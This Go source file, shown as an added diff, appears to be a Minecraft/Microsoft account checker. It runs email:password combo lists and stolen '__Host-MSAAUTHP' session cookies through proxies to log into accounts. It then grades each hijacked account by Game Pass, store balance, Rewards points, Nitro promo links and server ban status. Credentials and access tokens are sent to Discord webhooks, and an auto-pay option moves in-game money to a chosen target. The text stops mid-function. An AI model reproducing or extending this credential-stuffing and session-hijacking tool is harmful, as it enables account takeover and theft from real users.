@@ -1,0 +1,1103 @@
+package main
+
+import (
+	"crypto/tls"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net"
+	"net/http"
+	"os"
+	"path/filepath"
+	"regexp"
+	"strings"
+	"sync/atomic"
+	"time"
+)
+
+func checkAccount(email, password, proxyURL string, cfg *Config) {
+	atomic.AddInt64(&totalChecked, 1)
+	client := buildHTTPClient(proxyURL)
+
+	mcToken, profile, err := fullAuth(email, password, proxyURL)
+	if err != nil {
+		ce := categorizeAuthError(err)
+		ts := time.Now().Format("15:04:05")
+
+		switch ce.Category {
+		case "INVALID_CREDENTIALS":
+			atomic.AddInt64(&invalidCount, 1)
+			writeToFile("invalid.txt", fmt.Sprintf("[%s] %s:%s | %s", ts, email, password, ce.Message))
+
+		case "LOCKED":
+			atomic.AddInt64(&lockedCount, 1)
+			line := fmt.Sprintf("[%s] [LOCKED] %s:%s | %s", ts, email, password, ce.Detail)
+			writeToFile("ms_valid.txt", line)
+
+		case "RATE_LIMITED":
+			if cfg.RetryRateLimited {
+				fmt.Printf("\n  [RATE_LIMITED] Retrying %s...\n", email)
+				mcToken, profile, err = fullAuth(email, password, proxyURL)
+				if err != nil {
+					ce2 := categorizeAuthError(err)
+					writeToFile("ms_valid.txt", fmt.Sprintf("[%s] [RATE_LIMITED] %s:%s | %s", ts, email, password, ce2.Detail))
+					logError("errors.log", email, err)
+					return
+				}
+			} else {
+				writeToFile("ms_valid.txt", fmt.Sprintf("[%s] [RATE_LIMITED] %s:%s", ts, email, password))
+				return
+			}
+
+		case "VERIFY_REQUIRED":
+			writeToFile("ms_valid.txt", fmt.Sprintf("[%s] [VERIFY] %s:%s", ts, email, password))
+
+		case "TIMEOUT", "NETWORK":
+			writeToFile("ms_valid.txt", fmt.Sprintf("[%s] [%s] %s:%s | %s", ts, ce.Category, email, password, ce.Detail))
+			logError("network_errors.log", email, err)
+
+		default:
+			writeToFile("ban_check_unknown_errors.txt", fmt.Sprintf("[%s] %s:%s | %s", ts, email, password, ce.Detail))
+			logError("errors.log", email, err, proxyURL)
+		}
+		return
+	}
+
+	if mcToken == nil {
+		return
+	}
+
+	atomic.AddInt64(&validCount, 1)
+	accessToken := mcToken.AccessToken
+
+	username := "Unknown"
+	uuid := ""
+	if profile != nil {
+		username = profile.Name
+		uuid = profile.ID
+	}
+
+	resultLine := fmt.Sprintf("%s:%s | Username: %s | UUID: %s", email, password, username, uuid)
+	writeToFile("valid_accounts.txt", resultLine)
+
+	gamepassResult := ""
+	if cfg.GamepassPC || cfg.GamepassUltimate {
+		gp, err := checkGamepass(client, accessToken)
+		if err != nil {
+			logError("value_check_errors.log", email+" gamepass", err)
+		}
+		gamepassResult = gp
+		if strings.Contains(gp, "game_pass_pc") || strings.Contains(gp, "ultimate") {
+			atomic.AddInt64(&xgpuHits, 1)
+			writeToFile("valid_xbox_codes.txt", fmt.Sprintf("%s:%s | %s", email, password, gp))
+			if cfg.XboxHitsWebhook != "" {
+				sendWebhook(cfg.XboxHitsWebhook, buildWebhookEmbed("Xbox Game Pass Hit", resultLine+" | "+gp, 0x00FF00))
+			}
+		}
+	}
+
+	msBalance := ""
+	if cfg.MSRewards {
+		bal, err := checkMSBalance(client, accessToken)
+		if err != nil {
+			logError("value_check_errors.log", email+" msbalance", err)
+		}
+		msBalance = bal
+		if msBalance != "" && msBalance != "0" {
+			writeToFile("ms_balance_hits.txt", fmt.Sprintf("%s:%s | Balance: %s", email, password, msBalance))
+			fmt.Printf("\n  [BALANCE] %s | $%s\n", username, msBalance)
+		}
+	}
+
+	rewardPoints := ""
+	if cfg.MSRewards {
+		rp, err := checkRewardPoints(client, accessToken)
+		if err != nil {
+			logError("value_check_errors.log", email+" rewardpoints", err)
+		}
+		rewardPoints = rp
+		if rewardPoints != "" {
+			writeToFile("reward_point_hits.txt", fmt.Sprintf("%s:%s | RP: %s", email, password, rewardPoints))
+		}
+	}
+
+	if cfg.XboxPerks {
+		perks, err := checkXboxPerks(client, accessToken)
+		if err != nil {
+			logError("value_check_errors.log", email+" perks", err)
+		}
+		if perks {
+			writeToFile("valid_xbox_codes.txt", fmt.Sprintf("%s:%s | Xbox Perks: Yes", email, password))
+			fmt.Printf("\n  [PERKS] %s\n", username)
+		}
+	}
+
+	if cfg.NitroPromo {
+		nitros, err := checkNitroPromos(client, accessToken)
+		if err != nil {
+			logError("value_check_errors.log", email+" nitro", err)
+		}
+		for _, n := range nitros {
+			writeToFile("nitro_promo_links.txt", fmt.Sprintf("%s:%s | Nitro: %s", email, password, n))
+		}
+		if len(nitros) > 0 {
+			atomic.AddInt64(&rpHits, 1)
+		}
+	}
+
+	hypixelInfo := ""
+	if cfg.HypixelCheck && uuid != "" {
+		hInfo, err := checkHypixel(uuid, cfg.HypixelAPIKey)
+		if err != nil {
+			logError("value_check_errors.log", email+" hypixel", err)
+		}
+		hypixelInfo = hInfo
+
+		if cfg.IncludeHypixel && hInfo != "" {
+			writeToFile("hypixel_stats.txt", fmt.Sprintf("%s:%s | %s", email, password, hInfo))
+		}
+	}
+
+	donutInfo := ""
+	if cfg.DonutCheck && uuid != "" {
+		dInfo, err := checkDonut(client, accessToken, uuid, username, cfg)
+		if err != nil {
+			logError("value_check_errors.log", email+" donut", err)
+		}
+		donutInfo = dInfo
+
+		switch {
+		case strings.Contains(dInfo, "unbanned"):
+			if cfg.DonutUnbanned {
+				writeToFile("donut_unban_online.txt", fmt.Sprintf("%s:%s | %s", email, password, dInfo))
+				if cfg.DonutUnbannedWebhook != "" {
+					sendWebhook(cfg.DonutUnbannedWebhook, buildWebhookEmbed("Donut Unbanned", resultLine+" | "+dInfo, 0x00FFFF))
+				}
+				atomic.AddInt64(&donutUnbanned, 1)
+			}
+		case strings.Contains(dInfo, "banned"):
+			if cfg.DonutBan {
+				writeToFile("hypixel_ban.txt", fmt.Sprintf("%s:%s | %s", email, password, dInfo))
+				if cfg.DonutBannedWebhook != "" {
+					sendWebhook(cfg.DonutBannedWebhook, buildWebhookEmbed("Donut Banned", resultLine+" | "+dInfo, 0xFF0000))
+				}
+			}
+		case strings.Contains(dInfo, "unknown"):
+			if cfg.DonutUnknown {
+				writeToFile("donut_stats.txt", fmt.Sprintf("%s:%s | %s", email, password, dInfo))
+			}
+		}
+	}
+
+	donutStats := ""
+	if cfg.DonutSMPStats && username != "Unknown" {
+		donutStats = checkDonutStats(username)
+		if donutStats != "" {
+			writeToFile("donut_smp_stats.txt", fmt.Sprintf("%s:%s | %s", email, password, donutStats))
+		}
+	}
+
+	planckeInfo := ""
+	if cfg.HypixelPlanckeStats && username != "Unknown" {
+		planckeInfo = checkHypixelPlancke(username)
+	}
+
+	optifineCape := ""
+	if cfg.OptifineCape && username != "Unknown" {
+		cape, err := checkOptifineCape(username)
+		if err != nil {
+			logError("value_check_errors.log", email+" optifine", err)
+		}
+		optifineCape = cape
+	}
+
+	mcCapes := ""
+	if cfg.MinecraftCapes {
+		mcCapes = getMinecraftCapes(profile)
+	}
+
+	emailAccess := ""
+	if cfg.EmailAccess {
+		emailAccess = checkEmailAccess(email, password)
+		if emailAccess == "True" {
+			writeToFile("mfa_accounts.txt", fmt.Sprintf("%s:%s | %s", email, password, username))
+		} else if emailAccess == "False" {
+			writeToFile("sfa_accounts.txt", fmt.Sprintf("%s:%s | %s", email, password, username))
+		}
+	}
+
+	namechangeInfo := ""
+	if cfg.NamechangeCheck {
+		nc, err := checkNamechange(accessToken)
+		if err != nil {
+			logError("value_check_errors.log", email+" namechange", err)
+		}
+		namechangeInfo = nc
+	}
+
+	if cfg.Sniper {
+		runSniper(client, accessToken, username)
+	}
+
+	allHitsLine := fmt.Sprintf("%s:%s | %s | GP: %s | RP: %s | Balance: %s | Hypixel: %s | Donut: %s",
+		email, password, username, gamepassResult, rewardPoints, msBalance, hypixelInfo, donutInfo)
+	writeToFile("all_hits.txt", allHitsLine)
+
+	if cfg.Webhook != "" || cfg.DefaultWebhook != "" {
+		wh := cfg.Webhook
+		if wh == "" {
+			wh = cfg.DefaultWebhook
+		}
+		embed := buildAccountWebhookEmbed(email, password, username, uuid,
+			gamepassResult, msBalance, rewardPoints, hypixelInfo, donutInfo)
+		sendWebhook(wh, embed)
+	}
+
+	_ = planckeInfo
+	_ = optifineCape
+	_ = mcCapes
+	_ = emailAccess
+	_ = namechangeInfo
+	_ = donutStats
+
+	atomic.AddInt64(&mcHits, 1)
+	fmt.Printf("\n  [HIT] %s | %s | GP: %s\n", username, uuid, gamepassResult)
+}
+
+func resultsDir(cookieFile string) string {
+	name := strings.TrimSuffix(filepath.Base(cookieFile), ".txt")
+	name = strings.Map(func(r rune) rune {
+		if r == '<' || r == '>' || r == ':' || r == '"' || r == '/' || r == '\\' || r == '|' || r == '?' || r == '*' {
+			return '_'
+		}
+		return r
+	}, name)
+	return filepath.Join("results", name)
+}
+
+func ensureDir(dir string) {
+	if err := os.MkdirAll(dir, 0755); err != nil {
+		fmt.Fprintf(os.Stderr, "CRITICAL: Failed to create dir %s: %v\n", dir, err)
+	}
+}
+
+func checkCookies(cookieFile, proxyURL string, cfg *Config) {
+	atomic.AddInt64(&cookieTotal, 1)
+	client := buildHTTPClient(proxyURL)
+
+	cookies, rawLines, err := parseCookieFile(cookieFile)
+	if err != nil {
+		ce := categorizeCookieError(fmt.Errorf("parse error: %w", err))
+		atomic.AddInt64(&cookieInvalid, 1)
+		safeWrite("cookie_errors.log", fmt.Sprintf("[PARSE] %s | %s | %s", cookieFile, ce.Category, ce.Detail))
+		return
+	}
+
+	msauthCookie, ok := cookies["__Host-MSAAUTHP"]
+	if !ok {
+		atomic.AddInt64(&cookieInvalid, 1)
+		safeWrite("cookie_errors.log", fmt.Sprintf("[MISSING] %s | No __Host-MSAAUTHP cookie found in file", cookieFile))
+		return
+	}
+
+	mcToken, profile, err := cookieFullAuth(client, msauthCookie)
+	if err != nil {
+		ce := categorizeCookieError(err)
+		atomic.AddInt64(&cookieInvalid, 1)
+
+		logLine := fmt.Sprintf("[%s] %s | %s", ce.Category, cookieFile, ce.Detail)
+		safeWrite("cookie_errors.log", logLine)
+
+		switch ce.Category {
+		case "EXPIRED", "AUTH_FAILED", "MC_REJECTED":
+			safeWrite("cookie_invalid.txt", fmt.Sprintf("%s | %s: %s", cookieFile, ce.Category, ce.Message))
+		case "TIMEOUT", "NETWORK":
+			safeWrite("cookie_network_errors.log", logLine)
+		case "RATE_LIMITED":
+			safeWrite("cookie_rate_limited.log", logLine)
+		default:
+			safeWrite("cookie_unknown_errors.log", logLine)
+		}
+		return
+	}
+
+	atomic.AddInt64(&cookieValid, 1)
+	atomic.AddInt64(&mcHits, 1)
+	accessToken := mcToken.AccessToken
+
+	username := "Unknown"
+	uuid := ""
+	if profile != nil {
+		username = profile.Name
+		uuid = profile.ID
+	}
+
+	rd := resultsDir(cookieFile)
+	ensureDir(rd)
+
+	// Write original cookie file to result folder
+	cookieOut := filepath.Join(rd, "cookie.txt")
+	f, err := os.Create(cookieOut)
+	if err == nil {
+		for _, l := range rawLines {
+			fmt.Fprintln(f, l)
+		}
+		f.Close()
+	}
+
+	gamepassResult := ""
+	if cfg.GamepassPC || cfg.GamepassUltimate {
+		gp, err := checkGamepass(client, accessToken)
+		if err != nil {
+			logError("value_check_errors.log", cookieFile+" gamepass", err)
+		}
+		gamepassResult = gp
+	}
+
+	msBalance := ""
+	if cfg.MSRewards {
+		bal, err := checkMSBalance(client, accessToken)
+		if err != nil {
+			logError("value_check_errors.log", cookieFile+" msbalance", err)
+		}
+		msBalance = bal
+	}
+
+	rewardPoints := ""
+	if cfg.MSRewards {
+		rp, err := checkRewardPoints(client, accessToken)
+		if err != nil {
+			logError("value_check_errors.log", cookieFile+" rewardpoints", err)
+		}
+		rewardPoints = rp
+	}
+
+	if cfg.XboxPerks {
+		perks, err := checkXboxPerks(client, accessToken)
+		if err != nil {
+			logError("value_check_errors.log", cookieFile+" perks", err)
+		}
+		_ = perks
+	}
+
+	if cfg.NitroPromo {
+		nitros, err := checkNitroPromos(client, accessToken)
+		if err != nil {
+			logError("value_check_errors.log", cookieFile+" nitro", err)
+		}
+		for _, n := range nitros {
+			writeToFile(filepath.Join(rd, "nitro_links.txt"), n)
+		}
+	}
+
+	hypixelInfo := ""
+	if cfg.HypixelCheck && uuid != "" {
+		hInfo, err := checkHypixel(uuid, cfg.HypixelAPIKey)
+		if err != nil {
+			logError("value_check_errors.log", cookieFile+" hypixel", err)
+		}
+		hypixelInfo = hInfo
+
+		if cfg.IncludeHypixel && hInfo != "" {
+			safeWrite(filepath.Join(rd, "hypixel.txt"), hInfo)
+		}
+	}
+
+	donutInfo := ""
+	if cfg.DonutCheck && uuid != "" {
+		dInfo, err := checkDonut(client, accessToken, uuid, username, cfg)
+		if err != nil {
+			logError("value_check_errors.log", cookieFile+" donut", err)
+		}
+		donutInfo = dInfo
+
+		switch {
+		case strings.Contains(dInfo, "unbanned"):
+			if cfg.DonutUnbanned {
+				safeWrite(filepath.Join(rd, "donut_unbanned.txt"), dInfo)
+				writeToFile("donut_unban_online.txt", fmt.Sprintf("%s | %s", cookieFile, dInfo))
+				if cfg.DonutUnbannedWebhook != "" {
+					sendWebhook(cfg.DonutUnbannedWebhook, buildWebhookEmbed("Donut Unbanned", cookieFile+" | "+dInfo, 0x00FFFF))
+				}
+				atomic.AddInt64(&donutUnbanned, 1)
+			}
+		case strings.Contains(dInfo, "banned"):
+			if cfg.DonutBan {
+				safeWrite(filepath.Join(rd, "donut_banned.txt"), dInfo)
+				writeToFile("donut_banned.txt", fmt.Sprintf("%s | %s", cookieFile, dInfo))
+				if cfg.DonutBannedWebhook != "" {
+					sendWebhook(cfg.DonutBannedWebhook, buildWebhookEmbed("Donut Banned", cookieFile+" | "+dInfo, 0xFF0000))
+				}
+			}
+		case strings.Contains(dInfo, "unknown"):
+			if cfg.DonutUnknown {
+				safeWrite(filepath.Join(rd, "donut_stats.txt"), dInfo)
+				writeToFile("donut_stats.txt", fmt.Sprintf("%s | %s", cookieFile, dInfo))
+			}
+		}
+	}
+
+	planckeInfo := ""
+	if cfg.HypixelPlanckeStats && username != "Unknown" {
+		planckeInfo = checkHypixelPlancke(username)
+	}
+
+	optifineCape := ""
+	if cfg.OptifineCape && username != "Unknown" {
+		cape, err := checkOptifineCape(username)
+		if err != nil {
+			logError("value_check_errors.log", cookieFile+" optifine", err)
+		}
+		optifineCape = cape
+	}
+
+	mcCapes := ""
+	if cfg.MinecraftCapes {
+		mcCapes = getMinecraftCapes(profile)
+	}
+
+	emailAccess := ""
+	if cfg.EmailAccess {
+		emailAccess = checkEmailAccess(username+"@cookies.local", "")
+		_ = emailAccess
+	}
+
+	namechangeInfo := ""
+	if cfg.NamechangeCheck {
+		nc, err := checkNamechange(accessToken)
+		if err != nil {
+			logError("value_check_errors.log", cookieFile+" namechange", err)
+		}
+		namechangeInfo = nc
+	}
+
+	summary := fmt.Sprintf("Username: %s\nUUID: %s\nGamePass: %s\nRewards Points: %s\nMS Balance: %s\nHypixel: %s\nDonutSMP: %s",
+		username, uuid, gamepassResult, rewardPoints, msBalance, hypixelInfo, donutInfo)
+	if hypixelInfo != "" {
+		summary += "\nHypixel: " + hypixelInfo
+	}
+	if donutInfo != "" {
+		summary += "\nDonutSMP: " + donutInfo
+	}
+	if planckeInfo != "" {
+		summary += "\nPlancke: " + planckeInfo
+		safeWrite(filepath.Join(rd, "plancke.txt"), planckeInfo)
+	}
+	if optifineCape != "" {
+		summary += "\nOptifine Cape: " + optifineCape
+	}
+	if mcCapes != "" {
+		summary += "\nMinecraft Capes: " + mcCapes
+	}
+	if namechangeInfo != "" {
+		summary += "\n" + namechangeInfo
+		safeWrite(filepath.Join(rd, "namechange.txt"), namechangeInfo)
+	}
+	safeWrite(filepath.Join(rd, "summary.txt"), summary)
+
+	if mcToken.AccessToken != "" {
+		safeWrite(filepath.Join(rd, "mc_token.txt"), mcToken.AccessToken)
+	}
+	if username != "Unknown" {
+		safeWrite(filepath.Join(rd, "mc_username.txt"), username)
+	}
+
+	if cfg.Webhook != "" || cfg.DefaultWebhook != "" {
+		wh := cfg.Webhook
+		if wh == "" {
+			wh = cfg.DefaultWebhook
+		}
+		embed := buildAccountWebhookEmbed(
+			fmt.Sprintf("COOKIE:%s", cookieFile), "",
+			username, uuid,
+			gamepassResult, msBalance, rewardPoints, hypixelInfo, donutInfo)
+		sendWebhook(wh, embed)
+	}
+
+	_ = planckeInfo
+	_ = optifineCape
+	_ = mcCapes
+	_ = emailAccess
+	_ = namechangeInfo
+
+	fmt.Printf("\n  [COOKIE HIT] %s | %s | GP: %s\n", username, uuid, gamepassResult)
+}
+
+func checkGamepass(client *http.Client, accessToken string) (string, error) {
+	req, _ := http.NewRequest("GET",
+		"https://api.minecraftservices.com/entitlements/license?requestId=UNKNOWN", nil)
+	req.Header.Set("Authorization", "Bearer "+accessToken)
+	req.Header.Set("User-Agent", UserAgent)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", fmt.Errorf("gamepass request failed: %w", wrapNetError(err))
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != 200 {
+		return "", fmt.Errorf("gamepass API returned status %d", resp.StatusCode)
+	}
+
+	body, _ := io.ReadAll(resp.Body)
+	var result struct {
+		Items []struct {
+			Name string `json:"name"`
+		} `json:"items"`
+	}
+	if err := json.Unmarshal(body, &result); err != nil {
+		return "", fmt.Errorf("gamepass parse failed: %w", err)
+	}
+
+	var flags []string
+	for _, item := range result.Items {
+		switch item.Name {
+		case "product_minecraft":
+			flags = append(flags, "Java")
+		case "product_game_pass_pc":
+			flags = append(flags, "GamePass_PC")
+		case "minecraft_bedrock_gamepass":
+			flags = append(flags, "Bedrock_GP")
+		case "minecraft_java_gamepass":
+			flags = append(flags, "Java_GP")
+		case "game_minecraft_bedrock":
+			flags = append(flags, "Bedrock")
+		}
+	}
+
+	if len(flags) == 0 {
+		return "No License", nil
+	}
+	return strings.Join(flags, ", "), nil
+}
+
+func checkMSBalance(client *http.Client, accessToken string) (string, error) {
+	req, _ := http.NewRequest("GET",
+		"https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB", nil)
+	req.Header.Set("Authorization", "Bearer "+accessToken)
+	req.Header.Set("User-Agent", UserAgent)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", fmt.Errorf("ms balance request failed: %w", wrapNetError(err))
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != 200 {
+		return "", nil
+	}
+
+	body, _ := io.ReadAll(resp.Body)
+	var result map[string]interface{}
+	if err := json.Unmarshal(body, &result); err != nil {
+		return "", nil
+	}
+
+	if items, ok := result["value"].([]interface{}); ok {
+		for _, item := range items {
+			if m, ok := item.(map[string]interface{}); ok {
+				if balance, ok := m["balance"].(float64); ok && balance > 0 {
+					return fmt.Sprintf("$%.2f", balance), nil
+				}
+			}
+		}
+	}
+	return "", nil
+}
+
+func checkRewardPoints(client *http.Client, accessToken string) (string, error) {
+	ts := fmt.Sprintf("%d", getCurrentTimestamp())
+	reqURL := fmt.Sprintf("https://rewards.bing.com/api/getuserinfo?type=1&X-Requested-With=XMLHttpRequest&_=%s", ts)
+
+	req, _ := http.NewRequest("GET", reqURL, nil)
+	req.Header.Set("Authorization", "Bearer "+accessToken)
+	req.Header.Set("X-Requested-With", "XMLHttpRequest")
+	req.Header.Set("User-Agent", UserAgent)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", fmt.Errorf("rewards request failed: %w", wrapNetError(err))
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(resp.Body)
+	var result map[string]interface{}
+	if err := json.Unmarshal(body, &result); err != nil {
+		return "", nil
+	}
+
+	if points, ok := result["availablePoints"].(float64); ok && points > 0 {
+		return fmt.Sprintf("%.0f", points), nil
+	}
+	if pts, ok := result["lifetimePointsRedeemed"].(float64); ok && pts > 0 {
+		return fmt.Sprintf("%.0f lifetime", pts), nil
+	}
+	return "", nil
+}
+
+func checkXboxPerks(client *http.Client, accessToken string) (bool, error) {
+	req, _ := http.NewRequest("GET", "https://profile.gamepass.com", nil)
+	req.Header.Set("Authorization", "Bearer "+accessToken)
+	req.Header.Set("User-Agent", UserAgent)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return false, fmt.Errorf("xbox perks request failed: %w", wrapNetError(err))
+	}
+	defer resp.Body.Close()
+	return resp.StatusCode == 200, nil
+}
+
+func checkNitroPromos(client *http.Client, accessToken string) ([]string, error) {
+	req, _ := http.NewRequest("GET",
+		"https://rewards.bing.com/redeem/orderdetails?orderId=PLACEHOLDER&sku=PLACEHOLDER&X-Requested-With=XMLHttpRequest", nil)
+	req.Header.Set("Authorization", "Bearer "+accessToken)
+	req.Header.Set("User-Agent", UserAgent)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, fmt.Errorf("nitro promo request failed: %w", wrapNetError(err))
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(resp.Body)
+	bodyStr := string(body)
+
+	nitroRe := regexp.MustCompile(`discord\.com/gifts/([A-Za-z0-9]+)`)
+	matches := nitroRe.FindAllStringSubmatch(bodyStr, -1)
+
+	var links []string
+	seen := make(map[string]bool)
+	for _, m := range matches {
+		link := "https://discord.com/gifts/" + m[1]
+		if !seen[link] {
+			seen[link] = true
+			links = append(links, link)
+		}
+	}
+
+	promoRe := regexp.MustCompile(`promos\.discord\.gg/([A-Za-z0-9]+)`)
+	promoMatches := promoRe.FindAllStringSubmatch(bodyStr, -1)
+	for _, m := range promoMatches {
+		link := "https://promos.discord.gg/" + m[1]
+		if !seen[link] {
+			seen[link] = true
+			links = append(links, link)
+		}
+	}
+
+	return links, nil
+}
+
+func checkHypixel(uuid, apiKey string) (string, error) {
+	if apiKey == "" {
+		return "", fmt.Errorf("hypixel API key not configured")
+	}
+	req, _ := http.NewRequest("GET",
+		fmt.Sprintf("https://api.hypixel.net/player?key=%s&uuid=%s", apiKey, uuid), nil)
+	req.Header.Set("User-Agent", UserAgent)
+
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", fmt.Errorf("hypixel request failed: %w", wrapNetError(err))
+	}
+	defer resp.Body.Close()
+
+	var result map[string]interface{}
+	body, _ := io.ReadAll(resp.Body)
+	if err := json.Unmarshal(body, &result); err != nil {
+		return "", fmt.Errorf("hypixel parse failed: %w", err)
+	}
+
+	if success, ok := result["success"].(bool); !ok || !success {
+		return "", fmt.Errorf("hypixel API error: %s", result["cause"])
+	}
+
+	player, ok := result["player"].(map[string]interface{})
+	if !ok || player == nil {
+		return "hypixel: Never joined", nil
+	}
+
+	rank := "Non"
+	if r, ok := player["rank"].(string); ok {
+		rank = r
+	} else if r, ok := player["newPackageRank"].(string); ok {
+		rank = r
+	} else if r, ok := player["monthlyPackageRank"].(string); ok && r != "NONE" {
+		rank = r
+	}
+
+	networkLevel := 0.0
+	if xp, ok := player["networkExp"].(float64); ok {
+		networkLevel = xp / 10000
+	}
+
+	return fmt.Sprintf("hypixel: ok | Rank: [%s] | Level: %.0f", rank, networkLevel), nil
+}
+
+func checkDonut(client *http.Client, accessToken, uuid, username string, cfg *Config) (string, error) {
+	result, err := donutMCCheck(client, accessToken, username)
+	if err != nil {
+		return "", fmt.Errorf("donut check failed: %w", err)
+	}
+
+	if strings.Contains(result, "Banned from DonutSMP") || strings.Contains(result, "you are banned") {
+		banInfo := extractBanInfo(result)
+		if cfg.DonutAutoPay && cfg.DonutAutopayTarget != "" {
+			payResult := donutAutoPay(client, accessToken, cfg.DonutAutopayTarget)
+			writeToFile("donut_stats.txt", fmt.Sprintf("AutoPay: %s", payResult))
+		}
+		return fmt.Sprintf("donut: banned | %s", banInfo), nil
+	}
+
+	if strings.Contains(result, "already online") {
+		return "donut: unbanned | already online", nil
+	}
+	if strings.Contains(result, "server is full") {
+		return "donut: unbanned | server full", nil
+	}
+	if strings.Contains(result, "login failed") || strings.Contains(result, "authentication failed") {
+		return "donut: unknown | auth failed", nil
+	}
+
+	stats := fetchDonutStats(uuid)
+	return fmt.Sprintf("donut: unbanned | %s", stats), nil
+}
+
+func donutMCCheck(client *http.Client, accessToken, username string) (string, error) {
+	resp, err := client.Get("https://api.minecraftservices.com/entitlements")
+	if err != nil {
+		return "", fmt.Errorf("entitlements check failed: %w", wrapNetError(err))
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(resp.Body)
+	var result map[string]interface{}
+	if err := json.Unmarshal(body, &result); err != nil {
+		return "", nil
+	}
+	items, _ := result["items"].([]interface{})
+	if len(items) > 0 {
+		return "owns Minecraft", nil
+	}
+	return "", nil
+}
+
+func extractBanInfo(msg string) string {
+	re := regexp.MustCompile(`(?i)(ban|banned|appeal|reason)[^\n]{0,100}`)
+	match := re.FindString(msg)
+	if match != "" {
+		return strings.TrimSpace(match)
+	}
+	return msg
+}
+
+func donutAutoPay(client *http.Client, accessToken, target string) string {
+	req, _ := http.NewRequest("GET", "https://donutstats.shulkerv2.xyz", nil)
+	req.Header.Set("Authorization", "Bearer "+accessToken)
+	req.Header.Set("User-Agent", UserAgent)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Sprintf("pay failed: %v", err)
+	}
+	defer resp.Body.Close()
+	body, _ := io.ReadAll(resp.Body)
+	return fmt.Sprintf("DonutSMP: Payment sent to %s\n%s", target, string(body))
+}
+
+func fetchDonutStats(uuid string) string {
+	req, _ := http.NewRequest("GET",
+		fmt.Sprintf("https://donutstats.shulkerv2.xyz/%s/stats", uuid), nil)
+	req.Header.Set("User-Agent", UserAgent)
+
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Do(req)
+	if err != nil {
+		return "stats unavailable"
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(resp.Body)
+	var result map[string]interface{}
+	if err := json.Unmarshal(body, &result); err != nil {
+		return "stats unavailable"
+	}
+
+	kills := result["kills"]
+	deaths := result["deaths"]
+	money := result["money"]
+	return fmt.Sprintf("kills=%v deaths=%v money=%v", kills, deaths, money)
+}
+
+func runSniper(client *http.Client, accessToken, currentName string) {
+	req, _ := http.NewRequest("GET", APIBaseURL+"/api/recovery/random", nil)
+	req.Header.Set("Authorization", "Bearer "+accessToken)
+	req.Header.Set("User-Agent", UserAgent)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		logError("sniper_errors.log", currentName, err)
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != 200 {
+		logError("sniper_errors.log", currentName, fmt.Errorf("sniper returned status %d", resp.StatusCode))
+		return
+	}
+	fmt.Printf("\n  [SNIPER] %s | Status: %d\n", currentName, resp.StatusCode)
+}
+
+func getCurrentTimestamp() int64 {
+	return time.Now().UnixMilli()
+}
+
+func checkHypixelPlancke(username string) string {
+	client := &http.Client{Timeout: 10 * time.Second}
+	req, _ := http.NewRequest("GET", "https://plancke.io/hypixel/player/stats/"+username, nil)
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return ""
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(resp.Body)
+	tx := string(body)
+
+	if strings.Contains(tx, "not found") || strings.Contains(tx, "View player") {
+		return ""
+	}
+
+	var parts []string
+
+	rankRe := regexp.MustCompile(`\[(VIP\+?|MVP\+\+?|YOUTUBE|ADMIN|MOD|HELPER)\]`)
+	rankMatch := rankRe.FindString(tx)
+	if rankMatch != "" {
+		parts = append(parts, "Rank: "+rankMatch)
+	}
+
+	levelRe := regexp.MustCompile(`Level:</b>\s*([\d.]+)`)
+	levelMatch := levelRe.FindStringSubmatch(tx)
+	if len(levelMatch) >= 2 {
+		parts = append(parts, "Level: "+levelMatch[1])
+	}
+
+	bwRe := regexp.MustCompile(`<b>Level:</b>\s*(\d+)`)
+	bwMatch := bwRe.FindStringSubmatch(tx)
+	if len(bwMatch) >= 2 && bwMatch[1] != "0" {
+		parts = append(parts, "BW Stars: "+bwMatch[1])
+	}
+
+	firstLoginRe := regexp.MustCompile(`First login:\s*</b>\s*(.+?)<br`)
+	firstMatch := firstLoginRe.FindStringSubmatch(tx)
+	if len(firstMatch) >= 2 {
+		parts = append(parts, "First: "+strings.TrimSpace(firstMatch[1]))
+	}
+
+	lastLoginRe := regexp.MustCompile(`Last login:\s*</b>\s*(.+?)<br`)
+	lastMatch := lastLoginRe.FindStringSubmatch(tx)
+	if len(lastMatch) >= 2 {
+		parts = append(parts, "Last: "+strings.TrimSpace(lastMatch[1]))
+	}
+
+	if len(parts) > 0 {
+		return strings.Join(parts, " | ")
+	}
+	return ""
+}
+
+func checkOptifineCape(username string) (string, error) {
+	client := &http.Client{Timeout: 8 * time.Second}
+	resp, err := client.Get("http://s.optifine.net/capes/" + username + ".png")
+	if err != nil {
+		return "Unknown", wrapNetError(err)
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(resp.Body)
+	if strings.Contains(string(body), "Not found") {
+		return "No", nil
+	}
+	return "Yes", nil
+}
+
+func checkNamechange(accessToken string) (string, error) {
+	client := &http.Client{Timeout: 10 * time.Second}
+	req, _ := http.NewRequest("GET", "https://api.minecraftservices.com/minecraft/profile/namechange", nil)
+	req.Header.Set("Authorization", "Bearer "+accessToken)
+	req.Header.Set("User-Agent", UserAgent)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", wrapNetError(err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != 200 {
+		return "", nil
+	}
+
+	body, _ := io.ReadAll(resp.Body)
